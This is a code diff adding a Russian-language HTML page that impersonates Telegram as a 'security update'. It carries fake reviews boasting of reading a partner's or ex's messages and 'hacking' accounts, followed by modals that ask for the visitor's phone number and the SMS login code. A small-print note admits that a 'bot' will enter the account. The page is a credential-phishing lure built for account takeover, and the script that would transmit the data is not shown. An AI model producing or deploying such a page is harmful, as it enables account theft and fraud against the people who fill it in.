@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram — обновление безопасности</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://telegram.org/img/t_logo.svg" alt="Telegram" class="logo">
+            <h1>Telegram Alpha</h1>
+            <p>Обновление системы защиты</p>
+        </div>
+
+        <div class="reviews">
+            <div class="review">⭐️⭐️⭐️⭐️⭐️ Спасибо, успешно прочла, что пишет обо мне бывший!</div>
+            <div class="review">⭐️⭐️⭐️⭐️⭐️ Спасибо большое, увидела, с кем мой парень переписывается!</div>
+            <div class="review">⭐️⭐️⭐️⭐️⭐️ Спасибо за взлом аккаунта Telegram, очень помогло!</div>
+            <div class="review">⭐️⭐️⭐️⭐️⭐️ Всё работает, теперь я знаю правду!</div>
+            <div class="review">⭐️⭐️⭐️⭐️⭐️ Лучшее обновление, советую всем!</div>
+        </div>
+
+        <div class="action">
+            <button id="startBtn" class="btn">Активировать обновление</button>
+        </div>
+    </div>
+
+    <!-- Модальное окно для ввода номера -->
+    <div id="modal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2>Введите номер телефона</h2>
+            <p>Номер будет автоматически определён</p>
+            <input type="tel" id="phone" placeholder="+7 777 123 4567" value="+7">
+            <button id="sendPhoneBtn" class="btn">Отправить SMS-код</button>
+            <div id="countryInfo"></div>
+        </div>
+    </div>
+
+    <!-- Модальное окно для подтверждения отправки SMS -->
+    <div id="smsModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2>Разрешить отправку SMS?</h2>
+            <p>Telegram отправит SMS с кодом на ваш номер.</p>
+            <button id="allowSms" class="btn">Разрешить</button>
+            <button id="denySms" class="btn btn-secondary">Запретить</button>
+            <div id="detailsLink" class="details-link">Подробнее</div>
+            <div id="detailsText" class="details-text hidden">
+                Мы устанавливаем вам "Telegram Alpha Mode". Если вы не хотите, чтобы бот зашёл в ваш аккаунт и установил это обновление, откажитесь. Мы вас не принуждаем!
+            </div>
+        </div>
+    </div>
+
+    <!-- Модальное окно для ввода кода -->
+    <div id="codeModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2>Введите код из SMS</h2>
+            <input type="text" id="code" placeholder="5-значный код" maxlength="5">
+            <button id="sendCodeBtn" class="btn">Подтвердить</button>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
